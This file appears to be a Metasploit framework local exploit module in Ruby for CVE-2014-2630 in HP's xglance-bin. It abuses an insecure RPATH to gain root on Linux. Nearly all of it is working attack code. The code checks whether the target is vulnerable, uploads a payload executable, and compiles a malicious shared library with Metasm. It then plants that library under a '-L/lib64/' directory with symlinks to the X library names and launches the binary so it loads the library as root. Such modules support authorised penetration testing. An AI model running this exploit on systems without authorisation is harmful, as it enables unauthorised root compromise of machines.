##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  #include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Local::Linux

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'HP Performance Monitoring xglance Priv Esc',
        'Description'    => %q(
            This exploit takes advantage of the fact that xglance-bin, part of
            HP's Glance (or Performance Monitoring), was compiled with an insecure
            RPATH option that attempts to load libraries from a user controlled
            location (-L/lib64/).  Creating libraries in this location will result
            in an escalation of privileges to root.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die', # msf module
            'Tim Brown', # original finding
            'Robert Jaroszuk', # exploit
            'Marco Ortisi', # exploit
          ],
        'Platform'       => [ 'linux' ],
        'Arch'           => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes'   => [ 'shell', 'meterpreter' ],
        'Targets'        =>
          [
            [ 'Automatic', { } ],
            [ 'Linux x86', { 'Arch' => ARCH_X86 } ],
            [ 'Linux x64', { 'Arch' => ARCH_X64 } ]
          ],
        'Privileged'     => true,
        'References'     =>
          [
            [ 'EDB', '48000' ],
            [ 'URL', 'https://seclists.org/fulldisclosure/2014/Nov/55' ], # permissions, original finding
            [ 'URL', 'https://www.redtimmy.com/linux-hacking/perf-exploiter/' ], # exploit
            [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2630/' ],
            [ 'CVE', '2014-2630' ]
          ],
        'DisclosureDate' => "Nov 19 2014",
        'DefaultTarget'  => 0
      )
    )
    register_advanced_options [
      OptBool.new('ForceExploit',  [ false, 'Override check result', false ]),
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]

  end

  # Simplify pulling the writable directory variable
  def base_dir
    datastore['WritableDir'].to_s
  end

  # Simplify and standardize uploading a file
  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    write_file path, data
  end

  # Simplify uploading and chmoding a file
  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
    register_file_for_cleanup path
  end

  # Pull the exploit binary or file (.c typically) from our system
  def exploit_data
    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-2630.c')
  end

  def exploit_folder
    "#{base_dir}/-L/lib64/"
  end

  def find_libs
    libs = cmd_exec 'ldd /opt/perf/bin/xglance-bin | grep libX'
    /(?<lib>libX.+\.so\.\d) => -L\/lib64/ =~ libs
    return nil if lib.nil?
    lib
  end

  def check
    unless file? '/opt/perf/bin/xglance-bin'
      vprint_error "/opt/perf/bin/xglance-bin not found on system"
      return CheckCode::Safe
    end
    #libs = cmd_exec 'ldd /opt/perf/bin/xglance-bin | grep libX'
    lib = find_libs
    if lib.nil?
      vprint_error 'Patched xglance-bin, not linked to -L/lib64/'
      return CheckCode::Safe
    end
    vprint_good "xglance-bin found, and linked to vulnerable relative path -L/lib64/ through #{lib}"
    CheckCode::Appears
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    if is_root?
      unless datastore['ForceExploit']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Set target
    uname = cmd_exec 'uname -m'
    vprint_status "System architecture is #{uname}"
    if target.name.eql? 'Automatic'
      case uname
      when 'x86_64'
        my_target = targets[2]
      when /x86/, /i\d86/
        my_target = targets[1]
      else
        fail_with Failure::NoTarget, 'Unable to automatically select a target'
      end
    else
      my_target = target
    end
    print_status "Using target: #{my_target.name}"

    cpu = nil
    case my_target['Arch']
    when ARCH_X86
      cpu = Metasm::Ia32.new
    when ARCH_X64
      cpu = Metasm::X86_64.new
    else
      fail_with Failure::NoTarget, 'Target is not compatible'
    end

    so_stub = exploit_data
    so_stub.sub!('#{payload_path}', payload_path)
    begin
      so = Metasm::ELF.compile_c(cpu, so_stub).encode_string(:lib)
    rescue
      print_error "Metasm encoding failed: #{$ERROR_INFO}"
      elog "Metasm encoding failed: #{$ERROR_INFO.class} : #{$ERROR_INFO}"
      elog "Call stack:\n#{$ERROR_INFO.backtrace.join "\n"}"
      fail_with Failure::Unknown, 'Metasm encoding failed'
    end

    # delete folder
    vprint_status("Deleting exploit folder: #{exploit_folder}")
    rm_f exploit_folder
    # make folder
    vprint_status("Creating exploit folder: #{exploit_folder}")
    cmd_exec "mkdir -p #{exploit_folder}"
    register_file_for_cleanup "#{base_dir}/-L"
    # upload payload
    vprint_status('Uploading so and creating symlinks')
    upload("#{exploit_folder}libXm.so.3",so)
    # upload payload folder 2
    lib = find_libs
    cmd_exec "ln -s #{exploit_folder}libXm.so.3 #{exploit_folder}#{lib}"
    # just to be safe since this was in the original exploit
    cmd_exec "ln -s #{exploit_folder}libXm.so.3 #{exploit_folder}libXp.so.6"
    cmd_exec "ln -s #{exploit_folder}libXm.so.3 #{exploit_folder}libXt.so.6"

    # Launch exploit
    print_status "Launching xglance-bin..."
    output = cmd_exec "cd #{base_dir}; /opt/perf/bin/xglance-bin"
    output.each_line { |line| vprint_status line.chomp }
  end
end
